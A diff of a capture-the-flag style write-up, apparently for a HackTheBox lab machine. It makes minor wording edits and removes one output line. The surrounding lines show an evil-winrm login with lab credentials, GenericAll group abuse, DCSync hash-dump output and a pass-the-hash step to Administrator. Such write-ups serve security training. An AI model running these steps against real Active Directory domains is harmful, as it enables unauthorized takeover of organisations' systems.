@@ -189,7 +189,7 @@ And I found myself a privilege escalation path from **SVC-ALFRESCO** to **ADMINI
 ## Privilege Escalation
 
 Firstly, I got myself a shell on the target machine using the valid credentials. Next I will be abusing the **GenericAll** to make 
-svc-alfresco a member of the **Exchange Windows Permissions** completing our first jump.
+svc-alfresco a member of the **Exchange Windows Permissions** completing first jump.
 
 ```
 ❯ evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'
@@ -258,7 +258,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 [-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
 [*] Something wen't wrong with the DRSUAPI approach. Try again with -use-vss parameter
-[*] Cleaning up...
+
 ```
 
 Now that the domain is compromised. I performed a **pass-the-hash** attack to authenticate as **Administrator** and obtain a shell using **WinRM**.
